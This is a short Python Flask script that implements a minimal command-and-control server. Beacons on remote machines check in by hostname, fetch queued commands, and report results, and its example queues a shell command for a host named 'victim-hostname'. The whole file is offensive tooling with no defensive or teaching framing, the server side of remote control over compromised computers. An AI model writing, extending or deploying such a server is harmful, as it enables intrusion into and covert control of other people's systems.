from flask import Flask, request, jsonify

app = Flask(__name__)

# Store tasks for each beacon by hostname
tasks = {}

@app.route("/beacon", methods=["POST"])
def beacon():
    """Handle a beacon check-in and send tasks."""
    data = request.json
    hostname = data.get('hostname')

    if hostname:
        print(f"Beacon check-in from {hostname}")
        task_list = tasks.get(hostname, [])
        return jsonify({'tasks': task_list})
    else:
        return jsonify({'error': 'No hostname provided'}), 400

@app.route("/beacon/result", methods=["POST"])
def receive_result():
    """Receive the result of a task from the beacon."""
    data = request.json
    result = data.get('result')
    print(f"Received result from beacon: {result}")
    return jsonify({'status': 'success'})

def add_task(hostname, task):
    """Add a task for a specific beacon."""
    if hostname not in tasks:
        tasks[hostname] = []
    tasks[hostname].append(task)

if __name__ == "__main__":
    # Example usage
    add_task('victim-hostname', 'ifconfig')
    app.run(host='0.0.0.0', port=5000)
